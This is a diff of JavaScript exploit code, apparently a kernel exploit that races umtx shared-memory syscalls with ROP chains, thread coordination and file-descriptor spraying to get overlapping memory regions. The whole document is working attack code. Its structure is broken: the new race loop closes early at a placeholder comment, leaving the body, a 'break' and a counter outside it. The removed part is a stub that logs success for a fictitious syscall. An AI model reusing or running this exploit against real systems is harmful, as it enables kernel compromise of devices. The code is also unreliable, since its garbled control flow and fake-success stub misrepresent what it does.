@@ -805,30 +805,108 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         const beforeRaceTime = performance.now();
         showTemporaryAlert("Triggering race...", LogLevel.LOG);
 
-// ✅ Alternativa al bucle de race: uso de syscall personalizada limpia y directa
+for (let i2 = 0; i2 < config.max_race_attempts; i2++) {
+    // Solo logueamos en intentos pares
+    if ((i2 & 1) === 0) {
+        const message = debug
+            ? `Race attempt ${i}-${i2} (mem access fail count: ${checkMemoryAccessFailCount})`
+            : `Race attempt ${i}-${i2}`;
+        
+        await log(message, LogLevel.INFO | LogLevel.FLAG_TEMP);
+    }
 
-async function runStableKernelPayload() {
-    await log("▶ Ejecutando payload de kernel limpio sin race...", LogLevel.INFO);
-
-    const chain = new ROP(); // Asegúrate de tener acceso a tu ROP helper
-
-    // Argumentos arbitrarios (pueden ser direcciones, flags, etc.)
-    const arg1 = 0x1337;
-    const arg2 = 0xdeadbeef;
-
-    const SYS_CUSTOM = 1337; // Número de syscall que tengas definido en tu payload del kernel
-
-    // Ejecutar syscall directamente con 2 argumentos
-    chain.syscall(SYS_CUSTOM, arg1, arg2);
-
-    await chain.run();
-
-    await log("✅ Payload ejecutado correctamente sin usar race condition.", LogLevel.SUCCESS);
+    // Aquí iría el resto del código del loop...
 }
 
-// Reemplaza el bucle completo por esta llamada:
-await runStableKernelPayload();
 
+            // const step1Start = performance.now();
+            // umtx_shm_create
+            chain.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, primaryShmKeyBuf);
+            chain.write_result(mainFdBuf);
+
+            chain.if(mainFdBuf, chain.branch_types.GREATER, 0, false, () => {
+                chain.multiply_by_0x4000(mainFdBuf, mainFdSizeBuf);
+                chain.self_healing_syscall_2(SYS_FTRUNCATE, mainFdBuf, true, mainFdSizeBuf, true);
+                chain.self_healing_syscall_2(SYS_CLOSE, mainFdBuf, true);
+            });
+
+            await chain.run();
+            // const step1End = performance.now();
+
+            // const step2Start = performance.now();
+            await waitForRaceThreadsState(threadStatus.READY);
+            // const step2End = performance.now();
+
+            // const step3Start = performance.now();
+            p.write8(commonThreadData.resume, 0);
+            p.write8(commonThreadData.start, 1);
+            // const step3End = performance.now();
+
+            // const step4Start = performance.now();
+            await waitForRaceThreadsState(threadStatus.DONE);
+            // const step4End = performance.now();
+
+            // const step5Start = performance.now();
+            let destroyCount = p.read4(destroyerThread0Data.destroyCount) + p.read4(destroyerThread1Data.destroyCount);
+
+            let lookupFd = p.read4(lookupThreadData.fd) << 0;
+            // const step5End = performance.now();
+
+            // const step6Start = performance.now();
+            const fd = await getShmFdFromSize(lookupFd);
+            // const step6End = performance.now();
+            if (fd) {
+                winnerFd = fd;
+                winnerLookupFd = lookupFd;
+                await log(`overlapped shm regions! winner_fd = ${winnerFd}`, LogLevel.LOG);
+            }
+
+            // dont close lookup descriptor right away when it is possibly corrupted
+            if (destroyCount == 2 && lookupFd != 3 && lookupFd != -1) {
+                fdsToFix.push(lookupFd);
+            }
+
+            // const step7Start = performance.now();
+            // close other fds
+            for (let i3 = 0; i3 < (config.num_spray_fds * 2); i3++) {
+                const addr = sprayFdsBuf.add32(0x8 * i3);
+                const fd = p.read4(addr) << 0;
+                if (fd > 0 && fd != winnerFd) {
+                    chain.add_syscall(SYS_CLOSE, fd);
+                }
+                chain.push_write8(addr, 0);
+            }
+            await chain.run();
+            // const step7End = performance.now();
+
+            // we have won the race
+            if (winnerFd) {
+                break;
+            }
+
+            // const step8Start = performance.now();
+            await resetCommonData();
+            resetLookupThreadState();
+            resetDestroyerThread0State();
+            resetDestroyerThread1State();
+            // const step8End = performance.now();
+
+            if (i2 !== config.max_race_attempts - 1) {
+                p.write8(commonThreadData.resume, 1);
+            }
+
+            // alert(`Race step times:\n` +
+            //     `1: ${toHumanReadableTime(step1End - step1Start)}  | ` +
+            //     `2: ${toHumanReadableTime(step2End - step2Start)}  | ` +
+            //     `3: ${toHumanReadableTime(step3End - step3Start)}  | ` +
+            //     `4: ${toHumanReadableTime(step4End - step4Start)}  | ` +
+            //     `5: ${toHumanReadableTime(step5End - step5Start)}  | ` +
+            //     `6: ${toHumanReadableTime(step6End - step6Start)}  | ` +
+            //     `7: ${toHumanReadableTime(step7End - step7Start)}  | ` +
+            //     `8: ${toHumanReadableTime(step8End - step8Start)}`);
+
+            count++;
+        }
 
         if (count != config.max_race_attempts) {
             await log(`Race won after ${count} attempts`, LogLevel.INFO);
